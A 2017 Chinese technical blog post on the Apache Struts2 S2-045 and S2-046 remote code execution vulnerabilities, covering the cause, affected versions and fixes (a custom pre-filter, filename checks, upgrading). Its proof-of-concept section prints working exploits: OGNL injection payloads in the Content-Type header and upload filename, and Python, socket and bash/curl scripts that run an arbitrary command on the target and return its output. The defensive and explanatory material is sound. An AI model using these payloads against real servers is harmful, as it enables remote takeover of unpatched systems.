title: 关于 struts s2-045和s2-046漏洞
date: 2017-03-31 09:19:28
tags: [Java,安全]
categories: Java
description: 解决思路，在struts filter之前提前触发该错误，避免进入执行ognl
---

## 漏洞简介

Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。国内外都有大量厂商使用该框架。

Struts 2中此次存在远程代码执行漏洞(RCE)，主要是处理复杂数据类型时的默认解析，例文件上传，Jakarta Multipart parser，异常处理不当，进入buildErrorMessage触发点，导致OGNL代码执行。[s2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)中发现是`Content-Type`出现异常处理不当。[s2-046](https://cwiki.apache.org/confluence/display/WW/S2-046)中发现`Content-Disposition`的filename存在空字节时，或者是当使用JakartaStreamMultiPartRequest(`<constant name="struts.multipart.parser" value="jakarta-stream" />`)时，`Content-Length` 的长度值超长。

## 影响版本

Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

## 漏洞自测触发POC (来源网络)

UDPATE: 2018-06-23 change "{ &#35;" to " {% raw %}'{&#35;'{% endraw %} " for hexo or <code> {&#35; </code>

攻击者可以通过构造HTTP请求头中的Content-Type值可能造成远程代码执行。

查看struts 2.3.15.1版本
![filter中对request进行wrap](StrutsPrepareAndExecuteFilter_wrapRequest.png)
![(PrepareOperations_warprequest](PrepareOperations_warprequest.png)
![Dispatcher判断content-type是否包含multipart/form-data](Dispatcher_content-type.png)
![MultiPartRequestWrapper构造方法中调用paser](MultiPartRequestWrapper_paser.png)
![进入buildErrorMessage执行ognl](paser_buildErrorMessage.png)

### 

### S2-045 PoC_1

`Content-Type:  haha~multipart/form-data %{&#35;_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('calc')};`

### S2-045 PoC_2


```python
#! /usr/bin/env python
# encoding:utf-8
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
def poc():
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)
    response = urllib2.urlopen(request)
    print response.read()
poc()

```

### S2-046 PoC_1

在Struts 2.3.20以上的版本中，Struts2才提供了可选择的通过Streams实现Jakarta组件解析的方式。
触发条件,使用非默认解析jakarta-stream。例在strust.xml中有加入`<constant name="struts.multipart.parser" value="jakarta-stream" />`才能触发。
上传文件的大小（由Content-Length头指定）大于Struts2默认允许的最大大小（2M）。

触发漏洞的代码在 JakartaStreamMultiPartRequest类中，processUpload函数处理了content-length长度超长的异常，导致问题触发。
```java
private void processUpload(HttpServletRequest request, String saveDir)
        throws Exception {
    // Sanity check that the request is a multi-part/form-data request.
    if (ServletFileUpload.isMultipartContent(request)) {
        // Sanity check on request size.
        boolean requestSizePermitted = isRequestSizePermitted(request);
        // Interface with Commons FileUpload API
        // Using the Streaming API
        ServletFileUpload servletFileUpload = new ServletFileUpload();
        FileItemIterator i = servletFileUpload.getItemIterator(request);
        // Iterate the file items
        while (i.hasNext()) {
            try {
                FileItemStream itemStream = i.next();
                // If the file item stream is a form field, delegate to the
                // field item stream handler
                if (itemStream.isFormField()) {
                    processFileItemStreamAsFormField(itemStream);
                }
                // Delegate the file item stream for a file field to the
                // file item stream handler, but delegation is skipped
                // if the requestSizePermitted check failed based on the
                // complete content-size of the request.
                else {
                    // prevent processing file field item if request size not allowed.
                    // also warn user in the logs.
                    if (!requestSizePermitted) {
                        addFileSkippedError(itemStream.getName(), request);
                        LOG.warn("Skipped stream '#0', request maximum size (#1) exceeded.", itemStream.getName(), maxSize);
                        continue;
                    }
                    processFileItemStreamAsFileField(itemStream, saveDir);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
```

触发点
```java
LOG.warn("Skipped stream '#0', request maximum size (#1) exceeded.", itemStream.getName(), maxSize);
```

[原文](http://www.360zhijia.com/360anquanke/186154.html)

burp修改大小发送请求失败时候，可以试着去掉菜单栏`Repeater-->Update Content-Length`的勾选，然后进行实验，这样修改的大小不会在被burp修改。

```html    
POST /doUpload.action HTTP/1.1
Host: localhost:8080
Content-Length: 10000000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z
Connection: close
 
------WebKitFormBoundaryAnmUgTEhFhOZpr9z
Content-Disposition: form-data; name="upload"; filename="%{&#35;context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
Content-Type: text/plain
Kaboom 
 
------WebKitFormBoundaryAnmUgTEhFhOZpr9z--
```

```python
    #!/usr/bin env python
    import socket
    host="xxxxx"
    se=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    se.connect((host,80))
    se.send("GET / HTTP/1.1\n")
    se.send("User-Agent:curl/7.29.0\n")
    se.send("Host:"+host+"\n")
    se.send("Accept:*/*\n")
    se.send("Content-Type:multipart/form-data; boundary=---------------------------735323031399963166993862150\n")
    se.send("Connection:close\n")
    se.send("Content-Length:1000000000\n")
    se.send("\n\n")
    se.send("-----------------------------735323031399963166993862150\n")
    se.send('Content-Disposition: form-data; name="foo"; filename="%{&#35;context[\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'].addHeader(\'X-Test\',\'Kaboom\')}"\n')
    se.send("Content-Type: text/plain\n\n")
    se.send("x\n")
    se.send("-----------------------------735323031399963166993862150--\n\n")
    while True:
      buf = se.recv(1024)
      if not len(buf):
        break
      print buf
```

[原文](https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#)

### S2-046 PoC_2

header中的Content-Disposition中包含空字节。
文件名内容构造恶意的OGNL内容。

![JakartaMultiPartRequest中的processUpload](JakartaMultiPartRequest_processUpload.png)
![processFileField中处理各个header头](JakartaMultiPartRequest_processFileField.png)
![DiskFileItem的getName会处理NULL字符串](DiskFileItem_getName.png)
![调用Streams中的checkFileName检查NULL字符串](Streams_checkFileName.png)

```shell
    
#!/bin/bash
 
url=$1
cmd=$2
shift
shift
 
boundary="---------------------------735323031399963166993862150"
content_type="multipart/form-data; boundary=$boundary"
payload=$(echo "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"$cmd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")
 
printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n" "$payload" | curl "$url" -H "Content-Type: $content_type" -H "Expect: " -H "Connection: close" --data-binary @- $@
```

验证截图

![验证截图](360_check.png)


[360安全客](http://bobao.360.cn/learning/detail/3571.html)
当\0b不可当成检测字符，\0b可以被替换成\0000,\0a - \0z 等等。所以，最好是使用多种情况。
多个空格
多个空格，且里面可以添加\r\n
n个空格

### S2-046 PoC_3

[S2-046-PoC](https://github.com/pwntester/S2-046-PoC)

### Struts2漏洞利用工具

[shack2的Struts2漏洞利用工具](http://www.shack2.org/article/1374154000.html)
PS:大神该工具暂不支持https

## 修复建议

### 严格过滤

严格过滤 Content-Type 、filename里的内容，严禁ognl表达式相关字段。

实际上，我们只需在struts的filter之前，添加上自己的filter，提前触发Content-Type 、filename的相关验证就行了。

添加filter示例
Struts2Filter.java：
```java
package com.strutsfilter;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.servlet.FilterChain;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

import org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter;

public class Struts2Filter extends StrutsPrepareAndExecuteFilter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        String contentType = null;
        int contentLength = request.getContentLength();
        ServletContext sctx = request.getServletContext();
        String params = sctx.getInitParameter("content-type-param");
        if (request.getContentType() != null) {
            contentType = request.getContentType().toLowerCase(Locale.ENGLISH);
            // 请求大小小于2M，不是文件上传并且是正常请求时，放过
            if (params.contains(contentType) && contentLength < 2097152) {
                super.doFilter(request, response, chain);
            }
        }
        contentType = contentType.contains(",") ? contentType.split(",")[0].trim() : contentType.split(";")[0].trim(); // 文件上传时过滤掉文件边界
        if (contentType != null && contentLength < 2097152000) { // 文件上传并且文件小于2g
            if (!Contain_space(request)) { // content-type位于白名单放过并且上传的文件名称当中不包括空字节
                super.doFilter(request, response, chain);
            } else {
                PrintWriter writer = response.getWriter();
                writer.write("reject!");
                writer.flush();
                writer.close();
            }
        }
    }

    public boolean Contain_space(ServletRequest request) {
        try {
            InputStream is = request.getInputStream();
            BufferedReader read = new BufferedReader(new InputStreamReader(is, "utf-8"));
            StringBuilder sb = new StringBuilder();
            String tmp = null;
            while ((tmp = read.readLine()) != null) {
                sb.append(tmp + "\r\n");
            }
            Pattern pattern = Pattern.compile("filename(.*?)\r\n");
            // 从filename一直截取到下一个换行符位置，通过正则表达式过滤出上传的文件名称
            Matcher matcher = pattern.matcher(sb.toString().toLowerCase(Locale.ENGLISH)); // 将文件请求内容全部小写
            while (matcher.find()) {
                String filename = matcher.group();
                if (filename.contains("\\0b") || filename.contains(" ") || filename.contains("\\u0000")
                        || filename.contains("@ognl")) { // 对文件名称进行过滤，筛选掉含有空字符的上传请求
                    return true;
                }
            }
        } catch (IOException e) {
            //e.printStackTrace();
        }
        return false;
    }

}



```
web.xml配置参考：新增的filter需要在原有struts filter之前
```xml
<web-app>
  <display-name>Struts 2 Web Application</display-name>

  <filter>
    <filter-name>struts2</filter-name>
      <filter-class>com.strutsfilter.Struts2Filter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>struts2</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>
  
  <context-param>
    <param-name>content-type-param</param-name>
    <param-value>application/octet-stream,application/pdf,application/vnd.android.package-archive,
    application/vnd.rn-realmedia-vbr,application/x-bmp,application/x-img,application/x-javascript,
    application/x-jpe,application/x-jpg,application/x-png,application/x-shockwave-flash,
    application/x-x509-ca-cert,application/x-xls,audio/mp3,image/gif,image/jpeg,image/png,
    image/x-icon,image/rfc822,text/css,text/html,text/plain,text/xml,video/mpg,video/mpeg4,video/mpg,
    video/x-ms-wmv,application/x-www-form-urlencoded,multipart/form-data</param-value>
  </context-param>
  
</web-app>
```

正好项目中有spring，调用了spring web的MultipartResolver，对request进行wrap。这步避免了s2-045漏洞。再补上检查filename部分就行了。
```java
    MultipartResolver resolver = new CommonsMultipartResolver(reqWrapper.getSession().getServletContext());

    MultipartHttpServletRequest multipartRequest = resolver.resolveMultipart(request);
        // 这步将调用到common-fileupload.jar的FileUploadBase.java的FileItemIteratorImpl内部类进行下列判断 if ((null == contentType)|| (!contentType.toLowerCase(Locale.ENGLISH).startsWith("multipart/")))。所以，也可以直接在后续补上这段操作
    
    //检查s2-046
    Map<String,MultipartFile> fileMap = multipartRequest.getFileMap();
    Collection<MultipartFile> col = fileMap.values();
    Iterator<MultipartFile> itr = col.iterator();
    MultipartFile file = null;
    String fileName = null;
    while(itr.hasNext()){
        file = itr.next();
        file.getName();   // 这部分实际上调用到的fieldName，不是文件名
        fileName = file.getOriginalFilename();
        //这步将调用Streams.checkFileName()，检查文件名为NULL字符串的情况。也可以直接使用相关判断，文件名是否包含NULL字符串，OGNL字符
    }

```
实际上检查fileName，调用到common-fileupload.jar的Streams.checkFileName()，也是可以的。



### 改用其他解析

[改用pull](https://cwiki.apache.org/confluence/display/S2PLUGINS/Pell+Multipart+Plugin)

### 升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐）

如果您使用基于Jakarta插件，请升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐）

针对Struts2的升级，可将原应用相关的依赖jar包替换为最新的Struts2包，其中，有三个包是必须要升级的：

   - struts2-core-2.3.32.jar：Struts2核心包，也是此次漏洞发生的所在。
   - xwork-core-2.3.32.jar：Struts2依赖包，版本跟随Struts2一起更新。
   - ognl-3.0.19.jar：用于支持OGNL表达式，为其他包提供依赖。


 如果暂时不便升级，官方也已准备了两个可以作为应急使用的Jakarta插件版本，用户可以下载使用，[链接地址](https://github.com/apache/struts-extras)


补丁地址
[Struts 2.3.32](https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32) 
[2.3.32补丁修复方案](https://github.com/apache/struts/commit/b06dd50af2a3319dd896bf5c2f4972d2b772cf2b)

[Struts 2.5.10.1](https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1)
[2.5.10.1补丁修复方案](https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a)
